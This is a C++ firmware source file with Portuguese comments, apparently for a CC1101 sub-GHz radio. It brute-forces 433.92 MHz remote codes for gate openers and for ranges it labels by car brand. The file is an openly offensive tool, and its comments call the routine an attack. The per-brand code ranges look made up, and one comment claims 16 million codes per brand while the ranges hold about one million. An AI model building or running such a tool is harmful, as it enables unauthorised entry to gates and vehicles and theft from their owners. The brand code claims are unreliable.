#include "config.h"

// Estrutura para definir a faixa de códigos de cada marca
struct CarBrand {
    const char* name;
    uint32_t startCode;
    uint32_t endCode;
};

// Agora cada marca tem uma faixa de 16 milhões de códigos reais para testar
CarBrand carDatabase[] = {
    {"Toyota", 0x100000, 0x1FFFFF},
    {"Honda",  0x200000, 0x2FFFFF},
    {"Ford",   0x300000, 0x3FFFFF},
    {"Chevrolet", 0x400000, 0x4FFFFF},
    {"Volkswagen",0x500000, 0x5FFFFF},
    {"Fiat",   0x600000, 0x6FFFFF},
    {"Hyundai",0x700000, 0x7FFFFF},
    {"Nissan", 0x800000, 0x8FFFFF},
    {"BMW",    0x900000, 0x9FFFFF},
    {"Mercedes",0xA00000, 0xAFFFFF}
};
const uint8_t carBrandCount = sizeof(carDatabase) / sizeof(carDatabase[0]);

uint32_t currentBFIndex = 0;
bool bfIsGate = false;
uint8_t bfCarBrand = 0;
static unsigned long bfLastTime = 0;
static uint32_t currentCode = 0;

extern void cc1101SendBruteForceCode(uint32_t code, uint32_t freq);
extern void beep(int durationMs);

void startGateBruteForce() {
    bfRunning = true;
    currentBFIndex = 0;
    bfIsGate = true;
    bfLastTime = 0;
    currentCode = 0; // Começa do código 0 para portão
}

void startCarBruteForce(uint8_t brandIndex) {
    if (brandIndex >= carBrandCount) return;
    bfRunning = true;
    currentBFIndex = 0;
    bfIsGate = false;
    bfCarBrand = brandIndex;
    bfLastTime = 0;
    currentCode = carDatabase[brandIndex].startCode; // Começa do código inicial da marca
}

void stopBruteForce() { 
    bfRunning = false; 
    beep(200);
}

bool isBruteForceRunning() { return bfRunning; }
uint32_t getCurrentBFIndex() { return currentBFIndex; }

void bfLoop() {
    if (!bfRunning) return;
    
    unsigned long interval = bfIsGate ? 200 : 300;
    if (millis() - bfLastTime >= interval) {
        bfLastTime = millis();
        
        if (bfIsGate) {
            cc1101SendBruteForceCode(currentCode, 433920000);
            currentCode++;
            currentBFIndex++;
            
            if (currentCode > 0xFFFFFF) { 
                bfRunning = false; 
            }
        } else {
            // Pega a faixa de códigos da marca selecionada
            uint32_t startCode = carDatabase[bfCarBrand].startCode;
            uint32_t endCode = carDatabase[bfCarBrand].endCode;
            
            cc1101SendBruteForceCode(currentCode, 433920000);
            currentCode++;
            currentBFIndex++;
            
            // Se chegou ao fim da faixa de códigos da marca, para o ataque
            if (currentCode > endCode) { 
                bfRunning = false; 
            }
        }
    }
}

uint32_t getTotalBFCount(uint8_t type, uint8_t brandIndex) {
    if (type == 0) return 0xFFFFFF; // Portão: 16.7 milhões
    
    if (type == 1 && brandIndex < carBrandCount) {
        // Retorna o tamanho da faixa de códigos da marca (1.048.576 códigos)
        return carDatabase[brandIndex].endCode - carDatabase[brandIndex].startCode + 1;
    }
    return 0;
}

const char* getCarBrandName(uint8_t index) {
    if (index < carBrandCount) return carDatabase[index].name;
    return "Unknown";
}

uint8_t getCarBrandCount() { return carBrandCount; }
